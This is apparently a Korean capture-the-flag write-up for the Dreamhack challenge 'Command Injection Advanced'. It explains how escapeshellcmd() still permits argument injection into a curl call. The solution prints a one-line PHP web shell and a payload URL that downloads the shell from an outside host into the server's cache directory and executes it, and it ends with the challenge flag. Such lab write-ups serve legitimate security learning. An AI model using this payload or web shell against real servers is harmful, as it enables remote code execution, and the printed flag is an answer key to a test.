---
title: "[Dreamhack] Command Injection Advanced 해설"
author: jyp
date: 2026-06-09 12:00:09 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> 웹쉘을 넣는 기법을 활용한 해킹

## **난이도**: Lv.2
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── deploy
│   ├── flag.c
│   ├── run-lamp.sh
│   └── src
└── Dockerfile
```

## 주요 코드 

```php

#index.php

<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
    <?php
        if(isset($_GET['url'])){
            $url = $_GET['url'];
            if(strpos($url, 'http') !== 0 ){
                die('http only !');
            }else{
                $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
                $cache_file = './cache/'.md5($url);
                file_put_contents($cache_file, $result);
                echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
                echo '<pre>'. htmlentities($result) .'</pre>';
                return;
            }
        }else{
        ?>
            <form>
                <div class="field">
                    <label class="label">URL</label>
                    <input class="input" type="text" placeholder="url" name="url" required>
                </div>
                <div class="control">
                    <input class="button is-success" type="submit" value="submit">
                </div>
            </form>
        <?php
        }
    ?>
        </div>
        </div>
    </body>
</html>

```

이 웹 서버는 사용자가 입력한 URL을 받아 서버에서 curl로 요청하는 기능을 제공한다.

URL이 반드시 http로 시작해야 함 (strpos($url, 'http') !== 0)
escapeshellcmd()로 셸 메타문자가 이스케이프됨

# 풀이

## 취약점 — escapeshellcmd와 Argument Injection

`escapeshellcmd()`는 `; | & \ $` 같은 셸 메타문자는 막지만, 공백(space)은 막지 않는다.
따라서 새로운 명령을 실행할 수는 없어도, 실행 중인 `curl` 명령에 옵션(인자)을 추가로 주입할 수 있다. 이를 *Argument Injection*이라 한다.


## 페이로드

### 웹쉘 준비

```php
<?php system('/flag'); ?>
```

### Argument Injection으로 웹쉘 업로드

```
http://타겟주소/?url=<gist_raw_url>%20-o%20./cache/s.php
```

### 웹쉘 실행

```
http://타겟주소/cache/s.php
```

# 정답
DH{8ca5256a49452e4db9de7691a9c69b7678271383}
